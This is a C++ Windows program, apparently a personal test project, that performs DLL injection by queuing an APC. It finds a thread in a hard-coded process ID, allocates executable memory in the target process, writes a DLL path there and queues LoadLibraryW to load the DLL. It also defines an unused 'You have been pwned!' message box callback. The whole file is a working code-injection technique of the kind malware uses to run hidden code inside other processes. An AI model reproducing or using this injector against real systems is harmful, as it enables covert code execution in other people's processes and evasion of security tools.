#include "pch.h"
#include <windows.h>
#include <cstdlib>
#include <cstdio>
#include <TlHelp32.h>

void WINAPI pfnAPC(ULONG_PTR parameter)
{
	MessageBox(NULL, TEXT("You have been pwned!\n"), NULL, MB_OK);
	return;
}

DWORD GetThreadInfoo(DWORD PID)
{
	HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	THREADENTRY32 thread;
	thread.dwSize = sizeof(THREADENTRY32);
	if (Thread32First(snap, &thread))
	{
		while (Thread32Next(snap, &thread))
		{
			if (thread.th32OwnerProcessID == PID)
			{
				return thread.th32ThreadID;
			}
		}
	}

	return (EXIT_FAILURE);
}

int main()
{
	WCHAR DllPath[] = TEXT("C:\\Users\\Raique\\source\\repos\\queueapchooker\\Debug\\hookerdll.dll");
	DWORD dwSize = ( lstrlenW(DllPath) + 1 ) * sizeof(wchar_t);

	DWORD PID = 9968;
	DWORD TID = GetThreadInfoo(PID);
	ULONG parameter = 22;

	HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, TID);
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, PID);
	if (hThread != NULL)
	{
		LPVOID FAddr = VirtualAllocEx(hProcess, NULL, 1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (FAddr != NULL)
		{
			if (WriteProcessMemory(hProcess, FAddr, DllPath, dwSize, NULL))
			{
				LPTHREAD_START_ROUTINE ProcH = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
				if (ProcH != NULL)
				{
					QueueUserAPC((PAPCFUNC)ProcH, hThread,(ULONG_PTR)FAddr);
				}
				printf("Funcionou!\n");
			}
		}
	}
	else
	{
		printf("Nao Funcionou!\n");
	}

	CloseHandle(hThread);
	CloseHandle(hProcess);
	return (EXIT_SUCCESS);
}